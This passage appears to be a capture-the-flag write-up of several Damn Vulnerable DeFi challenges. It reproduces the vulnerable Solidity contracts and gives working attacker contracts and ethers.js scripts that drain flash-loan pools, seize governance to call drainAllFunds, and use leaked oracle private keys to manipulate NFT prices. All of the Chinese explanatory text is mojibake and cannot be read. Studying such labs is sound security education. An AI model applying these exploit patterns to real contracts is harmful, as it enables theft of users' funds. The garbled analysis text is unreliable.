IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();\n\n        require(address(this).balance >= balanceBefore, \"Flash loan hasn't been paid back\");        \n    &#125;\n&#125;\n \n\nanalyzeåˆçº¦æœ¬æ¥è®¾æœ‰1000ethï¼Œæˆ‘ä»¬è¦å°†1000ethå…¨éƒ¨å–å‡ºï¼Œåˆçº¦æä¾›å­˜å–åŠŸèƒ½ã€‚åœ¨flashloan()å‡½æ•°æ€»è°ƒç”¨äº†æŽ¥æ”¶åˆçº¦çš„execute()å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æž„é€ executeè¿›è¡Œæ”»å‡»ã€‚\né—ªç”µè´·1000ethï¼Œåœ¨å°†1000ethé€šè¿‡deposit()å‡½æ•°å­˜å…¥åˆçº¦ï¼Œæ­¤æ—¶require(address(this).balance &gt;&#x3D; balanceBefore)åˆ¤æ–­æ¡ä»¶å°†ä¼šé€šè¿‡æ–Œå¹¶ä¸”balances[attacker]ä¹Ÿè¾¾åˆ°äº†1000ethã€‚\nç›´æŽ¥è°ƒç”¨withdraw()å‡½æ•°å³å¯ã€‚\nattackattack contract\n\ncontract SideEntranceLenderPool1&#123;\n    function flashLoan(uint256) public&#123;&#125;\n    function withdraw() public &#123;&#125;\n    function deposit() public payable&#123;&#125;\n&#125;\ncontract SideEntranceAttacker &#123;\n\n    SideEntranceLenderPool1 private immutable pool;\n    address payable attacker;\n\n    constructor (address poolAddress, address attackerAddress) &#123;\n        pool = SideEntranceLenderPool1(poolAddress);\n        attacker = payable(attackerAddress);\n    &#125;\n\n    function attack(uint256 amount) external &#123;\n        pool.flashLoan(amount);\n        pool.withdraw();\n    &#125;\n\n    function execute() external payable&#123;\n        pool.deposit&#123;value: msg.value&#125;();\n    &#125;\n\n    receive () external payable &#123;\n        attacker.transfer(msg.value);\n    &#125;\n&#125;\n\n\n\nconst SideEntranceAttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', deployer);\n        const attackerContract = await SideEntranceAttackerFactory.deploy(this.pool.address, attacker.address);\n        await attackerContract.connect(attacker).attack(ETHER_IN_POOL)\n\n\n\n5.The rewarder\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nThereâ€™s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.\nAlice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!\nYou donâ€™t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.\nOh, by the way, rumours say a new pool has just landed on mainnet. Isnâ€™t it offering DVT tokens in flash loans?\ncode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./RewardToken.sol\";\nimport \"../DamnValuableToken.sol\";\nimport \"./AccountingToken.sol\";\n\n/**\n * @title TheRewarderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract TheRewarderPool &#123;\n\n    // Minimum duration of each round of rewards in seconds\n    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;\n\n    uint256 public lastSnapshotIdForRewards;\n    uint256 public lastRecordedSnapshotTimestamp;\n\n    mapping(address => uint256) public lastRewardTimestamps;\n\n    // Token deposited into the pool by users\n    DamnValuableToken public immutable liquidityToken;\n\n    // Token used for internal accounting and snapshots\n    // Pegged 1:1 with the liquidity token\n    AccountingToken public accToken;\n    \n    // Token in which rewards are issued\n    RewardToken public immutable rewardToken;\n\n    // Track number of rounds\n    uint256 public roundNumber;\n\n    constructor(address tokenAddress) &#123;\n        // Assuming all three tokens have 18 decimals\n        liquidityToken = DamnValuableToken(tokenAddress);\n        accToken = new AccountingToken();\n        rewardToken = new RewardToken();\n\n        _recordSnapshot();\n    &#125;\n\n    /**\n     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance\n     */\n    function deposit(uint256 amountToDeposit) external &#123;\n        require(amountToDeposit > 0, \"Must deposit tokens\");\n        \n        accToken.mint(msg.sender, amountToDeposit);\n        distributeRewards();\n\n        require(\n            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)\n        );\n    &#125;\n\n    function withdraw(uint256 amountToWithdraw) external &#123;\n        accToken.burn(msg.sender, amountToWithdraw);\n        require(liquidityToken.transfer(msg.sender, amountToWithdraw));\n    &#125;\n\n    function distributeRewards() public returns (uint256) &#123;\n        uint256 rewards = 0;\n\n        if(isNewRewardsRound()) &#123;\n            _recordSnapshot();\n        &#125;        \n        \n        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);\n        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);\n\n        if (amountDeposited > 0 &amp;&amp; totalDeposits > 0) &#123;\n            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;\n\n            if(rewards > 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;\n                rewardToken.mint(msg.sender, rewards);\n                lastRewardTimestamps[msg.sender] = block.timestamp;\n            &#125;\n        &#125;\n\n        return rewards;     \n    &#125;\n\n    function _recordSnapshot() private &#123;\n        lastSnapshotIdForRewards = accToken.snapshot();\n        lastRecordedSnapshotTimestamp = block.timestamp;\n        roundNumber++;\n    &#125;\n\n    function _hasRetrievedReward(address account) private view returns (bool) &#123;\n        return (\n            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &amp;&amp;\n            lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION\n        );\n    &#125;\n\n    function isNewRewardsRound() public view returns (bool) &#123;\n        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;\n    &#125;\n&#125;\n\nanalyzeé¢˜ç›®æä¾›é—ªç”µè´·åŠŸèƒ½ï¼Œå€Ÿå‡ºåˆçº¦å…¨éƒ¨çš„é’±å†deposit()å³å¯è®¾ç½®rewardé‡‘é¢ã€‚\nè¿›è¡ŒdepositåŽä¼šç«‹å³è®¡ç®—å¹¶ä¸”åˆ†é…å¥–åŠ±ã€‚\nå†withdrawè½¬å›žæ»¡è¶³flashloan()ä¸­çš„requireæ¡ä»¶ã€‚\nattackattackcontract\n\ninterface DamnValuableToken1&#123;\n    function approve(address,uint)external;\n    function transfer(address,uint)external;\n&#125;\ninterface FlashLoanerPool1&#123;\n    function flashLoan(uint) external;\n&#125;\ninterface TheRewarderPool1&#123;\n    function deposit(uint) external;\n    function withdraw(uint) external;\n&#125;\ninterface RewardToken1&#123;\n    function transfer(address,uint)external;\n    function balanceOf(address)external returns(uint);\n&#125;\ncontract RewarderAttacker &#123;\n\n    DamnValuableToken1 public immutable damnValuableToken;\n    FlashLoanerPool1 private immutable flashLoanpool;\n    TheRewarderPool1 private immutable rewarderPool;\n    RewardToken1 public immutable rewardToken;\n    address public attacker;\n\n    constructor (address tokenAddress, address flashLoanPoolAddress, address rewarderPoolAddress, address rewardTokenAddress, address attackerAddress) &#123;\n        damnValuableToken = DamnValuableToken1(tokenAddress);\n        flashLoanpool = FlashLoanerPool1(flashLoanPoolAddress);\n        rewarderPool = TheRewarderPool1(rewarderPoolAddress);\n        rewardToken = RewardToken1(rewardTokenAddress);\n        attacker = attackerAddress;\n    &#125;\n\n    function attack(uint256 amount) external &#123;\n        flashLoanpool.flashLoan(amount);\n    &#125;\n\n    // Take a flash loan of DVT, deposit to rewarder pool, call distributeRewards and collect reward, withdraw DVT\n    // send reward token to the attacker, return DVT\n    function receiveFlashLoan(uint256 amount) external &#123;\n        damnValuableToken.approve(address(rewarderPool), amount);\n        rewarderPool.deposit(amount);\n        rewarderPool.withdraw(amount);\n        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));\n        damnValuableToken.transfer(msg.sender, amount);\n    &#125;\n&#125;\n\n\n\nconst RewarderAttackerfactory = await ethers.getContractFactory('RewarderAttacker', deployer);\n        const attackerContract = await RewarderAttackerfactory.deploy(\n            this.liquidityToken.address,\n            this.flashLoanPool.address,\n            this.rewarderPool.address,\n            this.rewardToken.address,\n            attacker.address\n        );\n        await ethers.provider.send(\"evm_increaseTime\", [5 * 24 * 60 * 60]); // wait 5 days\n        await attackerContract.connect(attacker).attack(TOKENS_IN_LENDER_POOL);\n\n\n\n6.Selfie\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nA new cool lending pool has launched! Itâ€™s now offering flash loans of DVT tokens.\nWow, and it even includes a really fancy governance mechanism to control it.\nWhat could go wrong, right ?\nYou start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.\nSelfiePool code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"./SimpleGovernance.sol\";\n\n/**\n * @title SelfiePool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SelfiePool is ReentrancyGuard &#123;\n\n    using Address for address;\n\n    ERC20Snapshot public token;\n    SimpleGovernance public governance;\n\n    event FundsDrained(address indexed receiver, uint256 amount);\n\n    modifier onlyGovernance() &#123;\n        require(msg.sender == address(governance), \"Only governance can execute this action\");\n        _;\n    &#125;\n\n    constructor(address tokenAddress, address governanceAddress) &#123;\n        token = ERC20Snapshot(tokenAddress);\n        governance = SimpleGovernance(governanceAddress);\n    &#125;\n\n    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;\n        uint256 balanceBefore = token.balanceOf(address(this));\n        require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\");\n        \n        token.transfer(msg.sender, borrowAmount);        \n        \n        require(msg.sender.isContract(), \"Sender must be a deployed contract\");\n        msg.sender.functionCall(\n            abi.encodeWithSignature(\n                \"receiveTokens(address,uint256)\",\n                address(token),\n                borrowAmount\n            )\n        );\n        \n        uint256 balanceAfter = token.balanceOf(address(this));\n\n        require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\");\n    &#125;\n\n    function drainAllFunds(address receiver) external onlyGovernance &#123;\n        uint256 amount = token.balanceOf(address(this));\n        token.transfer(receiver, amount);\n        \n        emit FundsDrained(receiver, amount);\n    &#125;\n&#125;\n\nSimpleGovernance code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../DamnValuableTokenSnapshot.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title SimpleGovernance\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SimpleGovernance &#123;\n\n    using Address for address;\n    \n    struct GovernanceAction &#123;\n        address receiver;\n        bytes data;\n        uint256 weiAmount;\n        uint256 proposedAt;\n        uint256 executedAt;\n    &#125;\n    \n    DamnValuableTokenSnapshot public governanceToken;\n\n    mapping(uint256 => GovernanceAction) public actions;\n    uint256 private actionCounter;\n    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;\n\n    event ActionQueued(uint256 actionId, address indexed caller);\n    event ActionExecuted(uint256 actionId, address indexed caller);\n\n    constructor(address governanceTokenAddress) &#123;\n        require(governanceTokenAddress != address(0), \"Governance token cannot be zero address\");\n        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);\n        actionCounter = 1;\n    &#125;\n    \n    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) &#123;\n        require(_hasEnoughVotes(msg.sender), \"Not enough votes to propose an action\");\n        require(receiver != address(this), \"Cannot queue actions that affect Governance\");\n\n        uint256 actionId = actionCounter;\n\n        GovernanceAction storage actionToQueue = actions[actionId];\n        actionToQueue.receiver = receiver;\n        actionToQueue.weiAmount = weiAmount;\n        actionToQueue.data = data;\n        actionToQueue.proposedAt = block.timestamp;\n\n        actionCounter++;\n\n        emit ActionQueued(actionId, msg.sender);\n        return actionId;\n    &#125;\n\n    function executeAction(uint256 actionId) external payable &#123;\n        require(_canBeExecuted(actionId), \"Cannot execute this action\");\n        \n        GovernanceAction storage actionToExecute = actions[actionId];\n        actionToExecute.executedAt = block.timestamp;\n\n        actionToExecute.receiver.functionCallWithValue(\n            actionToExecute.data,\n            actionToExecute.weiAmount\n        );\n\n        emit ActionExecuted(actionId, msg.sender);\n    &#125;\n\n    function getActionDelay() public view returns (uint256) &#123;\n        return ACTION_DELAY_IN_SECONDS;\n    &#125;\n\n    /**\n     * @dev an action can only be executed if:\n     * 1) it's never been executed before and\n     * 2) enough time has passed since it was first proposed\n     */\n    function _canBeExecuted(uint256 actionId) private view returns (bool) &#123;\n        GovernanceAction memory actionToExecute = actions[actionId];\n        return (\n            actionToExecute.executedAt == 0 &amp;&amp;\n            (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)\n        );\n    &#125;\n    \n    function _hasEnoughVotes(address account) private view returns (bool) &#123;\n        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);\n        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;\n        return balance > halfTotalSupply;\n    &#125;\n&#125;\n\nanalyzeå‡½æ•°å‘çŽ°callè°ƒç”¨å¹¶ä¸”dataå¯æŽ§ï¼ŒçŒœæµ‹æ¼æ´žåœ¨æ­¤äº§ç”Ÿã€‚\ndrainAllFunds()å‡½æ•°å¯ä»¥å–èµ°å…¨éƒ¨çš„dvtï¼Œä½†æ˜¯å‡½æ•°é™åˆ¶onlyGovernanceã€‚æ‰€ä»¥åªè¦é€šè¿‡ä»¤SimpleGovernanceåˆçº¦ä¸»åŠ¨è°ƒç”¨æ± å­åˆçº¦ä¸‹çš„drainAllFunds()å‡½æ•°å³å¯\nå…ˆé€šè¿‡falshloan()å€Ÿå‡ºå…¨éƒ¨çš„tokenï¼Œä»Žè€Œæ»¡è¶³_hasEnoughVotes()ä¸‹çš„balance &gt; halfTotalSupplyï¼Œä½†æ˜¯åœ¨æ­¤ä¹‹å‰è¦å…ˆè°ƒç”¨tokençš„snapshot()å‡½æ•°ï¼Œå¦åˆ™å†balanceå°†ä¼šè¿”å›žå€¼0.\nè°ƒç”¨queueAction()å‡½æ•°ï¼Œè®¾ç½®receiverä¸ºpoolåˆçº¦ï¼Œdataä¸ºè°ƒç”¨drainAllFunds(attacker)å‡½æ•°çš„abiç¼–ç ã€‚\nç„¶åŽå†è°ƒç”¨executeAction()å‡½æ•°è§¦å‘callè°ƒç”¨ã€‚è°ƒç”¨åŽå°†å€Ÿå‡ºçš„tokenè¿”è¿˜å³å¯\nattackattackcontract\n\ninterface ERC20Snapshot1&#123;\n    function transfer(address,uint)external;\n&#125;\ninterface SelfiePool1&#123;\n    function flashLoan(uint)external;\n&#125;\ninterface SimpleGovernance1&#123;\n    function queueAction(address,bytes calldata ,uint)external returns(uint);\n&#125;\ninterface DamnValuableTokenSnapshot1&#123;\n    function snapshot()external;\n&#125;\ncontract SelfieAttacker &#123;\n\n    ERC20Snapshot1 public token;\n    SelfiePool1 private immutable pool;\n    SimpleGovernance1 private immutable governance;\n    address payable attacker;\n    uint256 public actionId;\n\n    constructor (address tokenAddress, address poolAddress, address governanceAddress, address attackerAddress) &#123;\n        token = ERC20Snapshot1(tokenAddress);\n        pool = SelfiePool1(poolAddress);\n        governance = SimpleGovernance1(governanceAddress);\n        attacker = payable(attackerAddress);\n    &#125;\n\n    function attack(uint256 amount) external &#123;\n        pool.flashLoan(amount);\n    &#125;\n\n    // Take the max amount of flash loan from the pool, take governance over, queue an action that drains all funds\n    // from the pool, advance 2 days in time, execute action\n    function receiveTokens(address tokenAddress, uint256 amount) external &#123;\n        DamnValuableTokenSnapshot1 governanceToken = DamnValuableTokenSnapshot1(tokenAddress);\n        governanceToken.snapshot();\n        actionId = governance.queueAction(address(pool), abi.encodeWithSignature(\"drainAllFunds(address)\",attacker), 0);\n        token.transfer(msg.sender, amount);\n    &#125;\n\n    receive() external payable &#123;&#125;\n&#125;\n\n\n\nconst SelfieAttackerFactory &#x3D; await ethers.getContractFactory(&#39;SelfieAttacker&#39;, deployer);\n       const attackerContract &#x3D; await SelfieAttackerFactory.deploy(this.token.address, this.pool.address, this.governance.address, attacker.address);\n       await attackerContract.connect(attacker).attack(TOKENS_IN_POOL);\n       const actionId &#x3D; ethers.BigNumber.from(await attackerContract.connect(attacker).actionId());\n       expect(actionId).to.be.gt(0);\n\n       await ethers.provider.send(&quot;evm_increaseTime&quot;, [2 * 24 * 60 * 60]); &#x2F;&#x2F; Advance in time 2 days\n       await this.governance.connect(attacker).executeAction(actionId);\n\n\n\n7.Compromised\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nWhile poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:\nHTTP&#x2F;2 200 OK\ncontent-type: text&#x2F;html\ncontent-language: en\nvary: Accept-Encoding\nserver: cloudflare\n\n4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35\n\n4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34\n        \n\nA related on-chain exchange is selling (absurdly overpriced) collectibles called â€œDVNFTâ€, now at 999 ETH each\nThis price is fetched from an on-chain oracle, and is based on three trusted reporters: 0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.\nStarting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.\nExchange code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\nimport \"./TrustfulOracle.sol\";\nimport \"../DamnValuableNFT.sol\";\n\n/**\n * @title Exchange\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract Exchange is ReentrancyGuard &#123;\n\n    using Address for address payable;\n\n    DamnValuableNFT public immutable token;\n    TrustfulOracle public immutable oracle;\n\n    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);\n    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);\n\n    constructor(address oracleAddress) payable &#123;\n        token = new DamnValuableNFT();\n        oracle = TrustfulOracle(oracleAddress);\n    &#125;\n\n    function buyOne() external payable nonReentrant returns (uint256) &#123;\n        uint256 amountPaidInWei = msg.value;\n        require(amountPaidInWei > 0, \"Amount paid must be greater than zero\");\n\n        // Price should be in [wei / NFT]\n        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());\n        require(amountPaidInWei >= currentPriceInWei, \"Amount paid is not enough\");\n\n        uint256 tokenId = token.safeMint(msg.sender);\n        \n        payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);\n\n        emit TokenBought(msg.sender, tokenId, currentPriceInWei);\n\n        return tokenId;\n    &#125;\n\n    function sellOne(uint256 tokenId) external nonReentrant &#123;\n        require(msg.sender == token.ownerOf(tokenId), \"Seller must be the owner\");\n        require(token.getApproved(tokenId) == address(this), \"Seller must have approved transfer\");\n\n        // Price should be in [wei / NFT]\n        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());\n        require(address(this).balance >= currentPriceInWei, \"Not enough ETH in balance\");\n\n        token.transferFrom(msg.sender, address(this), tokenId);\n        token.burn(tokenId);\n        \n        payable(msg.sender).sendValue(currentPriceInWei);\n\n        emit TokenSold(msg.sender, tokenId, currentPriceInWei);\n    &#125;\n\n    receive() external payable &#123;&#125;\n&#125;\n\nTrustfulOracle code// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/AccessControlEnumerable.sol\";\n\n/**\n * @title TrustfulOracle\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n * @notice A price oracle with a number of trusted sources that individually report prices for symbols.\n *         The oracle's price for a given symbol is the median price of the symbol over all sources.\n */\ncontract TrustfulOracle is AccessControlEnumerable &#123;\n\n    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256(\"TRUSTED_SOURCE_ROLE\");\n    bytes32 public constant INITIALIZER_ROLE = keccak256(\"INITIALIZER_ROLE\");\n\n    // Source address => (symbol => price)\n    mapping(address => mapping (string => uint256)) private pricesBySource;\n\n    modifier onlyTrustedSource() &#123;\n        require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));\n        _;\n    &#125;\n\n    modifier onlyInitializer() &#123;\n        require(hasRole(INITIALIZER_ROLE, msg.sender));\n        _;\n    &#125;\n\n    event UpdatedPrice(\n        address indexed source,\n        string indexed symbol,\n        uint256 oldPrice,\n        uint256 newPrice\n    );\n\n    constructor(address[] memory sources, bool enableInitialization) &#123;\n        require(sources.length > 0);\n        for(uint256 i = 0; i &lt; sources.length; i++) &#123;\n            _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);\n        &#125;\n\n        if (enableInitialization) &#123;\n            _setupRole(INITIALIZER_ROLE, msg.sender);\n        &#125;\n    &#125;\n\n    // A handy utility allowing the deployer to setup initial prices (only once)\n    function setupInitialPrices(\n        address[] memory sources,\n        string[] memory symbols,\n        uint256[] memory prices\n    ) \n        public\n        onlyInitializer\n    &#123;\n        // Only allow one (symbol, price) per source\n        require(sources.length == symbols.length &amp;&amp; symbols.length == prices.length);\n        for(uint256 i = 0; i &lt; sources.length; i++) &#123;\n            _setPrice(sources[i], symbols[i], prices[i]);\n        &#125;\n        renounceRole(INITIALIZER_ROLE, msg.sender);\n    &#125;\n\n    function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource &#123;\n        _setPrice(msg.sender, symbol, newPrice);\n    &#125;\n\n    function getMedianPrice(string calldata symbol) external view returns (uint256) &#123;\n        return _computeMedianPrice(symbol);\n    &#125;\n\n    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory) &#123;\n        uint256 numberOfSources = getNumberOfSources();\n        uint256[] memory prices = new uint256[](numberOfSources);\n\n        for (uint256 i = 0; i &lt; numberOfSources; i++) &#123;\n            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);\n            prices[i] = getPriceBySource(symbol, source);\n        &#125;\n\n        return prices;\n    &#125;\n\n    function getPriceBySource(string memory symbol, address source) public view returns (uint256) &#123;\n        return pricesBySource[source][symbol];\n    &#125;\n\n    function getNumberOfSources() public view returns (uint256) &#123;\n        return getRoleMemberCount(TRUSTED_SOURCE_ROLE);\n    &#125;\n\n    function _setPrice(address source, string memory symbol, uint256 newPrice) private &#123;\n        uint256 oldPrice = pricesBySource[source][symbol];\n        pricesBySource[source][symbol] = newPrice;\n        emit UpdatedPrice(source, symbol, oldPrice, newPrice);\n    &#125;\n\n    function _computeMedianPrice(string memory symbol) private view returns (uint256) &#123;\n        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));\n\n        // calculate median price\n        if (prices.length % 2 == 0) &#123;\n            uint256 leftPrice = prices[(prices.length / 2) - 1];\n            uint256 rightPrice = prices[prices.length / 2];\n            return (leftPrice + rightPrice) / 2;\n        &#125; else &#123;\n            return prices[prices.length / 2];\n        &#125;\n    &#125;\n\n    function _sort(uint256[] memory arrayOfNumbers) private pure returns (uint256[] memory) &#123;\n        for (uint256 i = 0; i &lt; arrayOfNumbers.length; i++) &#123;\n            for (uint256 j = i + 1; j &lt; arrayOfNumbers.length; j++) &#123;\n                if (arrayOfNumbers[i] > arrayOfNumbers[j]) &#123;\n                    uint256 tmp = arrayOfNumbers[i];\n                    arrayOfNumbers[i] = arrayOfNumbers[j];\n                    arrayOfNumbers[j] = tmp;\n                &#125;\n            &#125;\n        &#125;        \n        return arrayOfNumbers;\n    &#125;\n&#125;\n\n\n\nanalyzeé¢˜ç›®ä¸­çš„æ•°å­—äº‹åå…­è¿›åˆ¶ï¼Œè½¬å­—ç¬¦ä¸²ä¹‹åŽæ˜¯å­—ç¬¦ä¸²ï¼Œè¿›è¡Œbase64è§£ç å¾—åˆ°ç§é’¥ï¼Œåˆ†åˆ«å¯¹åº”account(0xe92401A4d3af5E446d93D11EEc806b1462b39D15)å’Œaccount(0x81A5D6E50C214044bE44cA0CB057fe119097850c)ã€‚\nå†exchangeä¸­å‘çŽ°ä»·æ ¼æ¥æºäºŽTrustfulOracleä¸­çš„getMedianPriceã€‚å®¡è®¡TrustfulOracleåˆçº¦å‘çŽ°_ sort()å‡½æ•°è¿›è¡Œä¸‰äººä»·æ ¼æŽ’åºï¼Œ\n_computeMedianPrice()å‡½æ•°èŽ·å¾—ä»·æ ¼ä¸­ä½æ•°ã€‚å½“å‰ä»·æ ¼ä¸º[999,999,999]ã€‚\næˆ‘ä»¬åˆ†åˆ«ä½¿ç”¨ä¸¤ä¸ªè´¦æˆ·è°ƒç”¨postPrice()å‡½æ•°ï¼Œå°†ä»·æ ¼è®¾ç½®ä¸º0ï¼Œä»·æ ¼å˜ä¸º[0,0,999],å†è´­ä¹°ä¸€ä¸ªnftã€‚å› ä¸ºæ¼æ´žåˆçº¦æœ¬æ¥æ€»å…±å…·æœ‰9999ethï¼Œæ‰€ä»¥å†åˆ†åˆ«ä½¿ç”¨ä¸¤ä¸ªè´¦æˆ·è°ƒç”¨postPrice()å‡½æ•°ï¼Œå°†ä»·æ ¼è®¾ç½®ä¸º9990ï¼Œä»·æ ¼å˜ä¸º[999,9990,9990],å†å–å‡ºä¸€ä¸ªnftï¼Œå³å¯èŽ·å¾—å·¨å¤§åˆ©æ¶¦\nattacklet privateKey1 = \"0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9\";\n   let privateKey2 = \"0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48\";\n   let compromisedOracle1 = new ethers.Wallet(privateKey1, ethers.provider);\n   let compromisedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);\n   await this.oracle.connect(compromisedOracle1).postPrice(\"DVNFT\", ethers.utils.parseEther(\"0\"));\n   await this.oracle.connect(compromisedOracle2).postPrice(\"DVNFT\", ethers.utils.parseEther(\"0\"));\n   const tx = await this.exchange.connect(attacker).buyOne(&#123; value: ethers.utils.parseEther(\"0.01\") &#125;);\n   await this.exchange.on(\"TokenBought\", async (sender, tokenId, currentPriceInWei) => &#123;\n   \tawait this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);\n       await this.oracle.connect(compromisedOracle1).postPrice(\"DVNFT\", EXCHANGE_INITIAL_ETH_BALANCE);\n       await this.oracle.connect(compromisedOracle2).postPrice(\"DVNFT\", EXCHANGE_INITIAL_ETH_BALANCE);\n       await this.exchange.connect(attacker).sellOne(tokenId);\n       await this.oracle.connect(compromisedOracle1).postPrice(\"DVNFT\", INITIAL_NFT_PRICE);\n       await this.oracle.connect(compromisedOracle2).postPrice(\"DVNFT\", INITIAL_NFT_PRICE);\n        &#125;);\n   await tx.wait(2);\n\n\n\n8.Puppet\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nThereâ€™s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.\nThereâ€™s a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.\nStarting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.\ncode// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"../DamnValuableToken.sol\";\n\n/**\n * @title PuppetPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract PuppetPool is ReentrancyGuard &#123;\n\n    using Address for address payable;\n\n    mapping(address => uint256) public deposits;\n    address public immutable uniswapPair;\n    DamnValuableToken public immutable token;\n    \n    event Borrowed(address indexed account, uint256 depositRequired, uint256 borrowAmount);\n\n    constructor (address tokenAddress, address uniswapPairAddress) &#123;\n        token = DamnValuableToken(tokenAddress);\n        uniswapPair = uniswapPairAddress;\n    &#125;\n\n    // Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH\n    function borrow(uint256 borrowAmount) public payable nonReentrant &#123;\n        uint256 depositRequired = calculateDepositRequired(borrowAmount);\n        \n        require(msg.value >= depositRequired, \"Not depositing enough collateral\");\n        \n        if (msg.value > depositRequired) &#123;\n            payable(msg.sender).sendValue(msg.value - depositRequired);\n        &#125;\n\n        deposits[msg.sender] = deposits[msg.sender] + depositRequired;\n\n        // Fails if the pool doesn't have enough tokens in liquidity\n        require(token.transfer(msg.sender, borrowAmount), \"Transfer failed\");\n\n        emit Borrowed(msg.sender, depositRequired, borrowAmount);\n    &#125;\n\n    function calculateDepositRequired(uint256 amount) public view returns (uint256) &#123;\n        return amount * _computeOraclePrice() * 2 / 10 ** 18;\n    &#125;\n\n    function _computeOraclePrice() private view returns (uint256) &#123;\n        // calculates the price of the token in wei according to Uniswap pair\n        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);\n    &#125;\n\n     /**\n     ... functions to deposit, redeem, repay, calculate interest, and so on ...\n     